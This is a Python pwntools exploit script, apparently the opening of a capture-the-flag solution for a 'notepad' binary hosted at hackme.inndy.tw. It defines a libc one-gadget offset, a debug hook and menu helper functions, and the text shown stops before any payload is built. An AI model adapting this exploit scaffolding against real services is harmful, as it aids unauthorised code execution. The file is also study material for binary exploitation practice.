#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("./notepad", env = {"LD_PRELOAD": "./libc-2.23.so.i386"})
    #  io = process("")

else:
    io = remote("hackme.inndy.tw", 7713)

elf = ELF("./notepad")
libc = ELF("./libc-2.23.so.i386")
oneGadgetOffset = 0x3ac3c

def DEBUG():
    raw_input("DEBUG: ")
    gdb.attach(io)

def new(size, data):
    io.sendlineafter("::> ", "a")
    io.sendlineafter(" > ", str(size))
    io.sendlineafter(" > ", data)

def open(idx, content):
    io.sendlineafter("::> ", "b")
    io.sendlineafter(" > ", str(idx))
    io.sendlineafter("(Y/n)", "y")
    io.sendlineafter(" > ", content)
    io.sendlineafter("::> ", "a")



